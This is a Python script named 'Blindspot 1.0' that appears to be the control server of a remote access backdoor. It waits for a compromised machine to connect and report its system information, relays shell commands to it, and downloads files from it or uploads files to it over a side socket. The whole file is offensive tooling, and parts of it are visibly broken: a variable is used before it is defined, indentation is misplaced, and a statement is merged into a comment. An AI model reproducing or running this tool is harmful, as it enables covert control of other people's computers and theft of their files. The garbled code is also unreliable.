#!/usr/bin/python


from socket import *





# listens for vonnection on port 555
# creates a new file at given path
# revices the file in chunks of 1024 bytes through the socket
# closes socket
def getFile(conn, data, path):
	conn.send(data.encode())
	h = ""
	p = 555
	
	s = socket(AF_INET, SOCK_STREAM)
	s.bind((h, p))
	s.listen(10)
	c, addr = s.accept()

	file = open(path, "wb")

	f = c.recv(1024)
	totalBytes = 0
	while f:
		totalBytes += len(f)
		file.write(f)
		f = c.recv(1024)
	print(str(totalBytes)+" bytes received")
	file.close()	
	c.close()





# listens for connection on port 555
# reads a file on local filesystem
# sends the file in chunks of 1024 bytes through the socket
# closes socket
def postFile(conn, data, path):
	conn.send(data.encode())
	h = ""
	p = 555
	s = socket(AF_INET, SOCK_STREAM)
	s.bind((h, p))
	s.listen(10)
	c, addr2 = s.accept()
	
	file = open(path, "rb")
	totalBytes = 0
	f = file.read(1024)

	while f:
		totalBytes += len(f)
		c.send(f)
		f = file.read(1024)
	print(str(totalBytes)+" Bytes sent")
	file.close()
	c.close()





# prints information about the programm
def info():
	print("Blindspot - Version 1.0")




# prints the entire manual
def manual():
	man = open("manual.txt", "r")
	print(man.read())




# returns a fancy multiline string
# header of the programm
def title():
	return """
__________.__  .__            .___                     __   
\\______   \\  | |__| ____    __| _/____________   _____/  |_ 
 |    |  _/  | |  |/    \\  / __ |/  ___/\\____ \\ /  _ \\   __\\
 |    |   \\  |_|  |   |  \\/ /_/ |\\___ \\ |  |_> >  <_> )  |  
 |______  /____/__|___|  /\\____ /____  >|   __/ \\____/|__|  
        \\/             \\/      \\/    \\/ |__|                
----------------------------------------------------------------
Blindspot                                            VERSION 1.0
----------------------------------------------------------------"""




# main function
# too lazy to comment
# the usual
def main():

	print(title())
	HOST = ''
	PORT = int(input("Enter port\n[>] "))

	
	print(addr)

s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind((HOST, PORT))

	print("[*] Listening on port %s" % str(PORT))

	s.listen(10)# listen for only 10 connection
	conn, addr = s.accept()# accept connections	print('[+] Connected by', addr)    # print connected by ipaddress
	data = conn.recv(1024)   # receive system information
	print("[+] " + data.decode())






	while conn:
		data = input("[>] ")
		command = data.split()
		

		# do stuff according to command
		if command[0] == "get":
			try:
				if len(command) >= 2:
					getFile(conn, data, command[2])
				else:
					print("missing parameter")
			except:
				print("invalid parameter")




		elif command[0] == "post":
			try:
				if len(command) >= 2:
					postFile(conn, data, command[1])
				else:
					print("missing parameter")
			except:
				print("invalid parameter")




		elif command [0] == "info":
			info()



		elif command[0] == "manual":
			manual()



		elif command[0] == "system":
			conn.send(data.encode())
			d = conn.recv(1024)
			try:
				print(d.decode())
			except:
				print(d)


		else:
			conn.send(data.encode())

			
	print("[!] Connection lost")



if __name__ == "__main__":
	main()
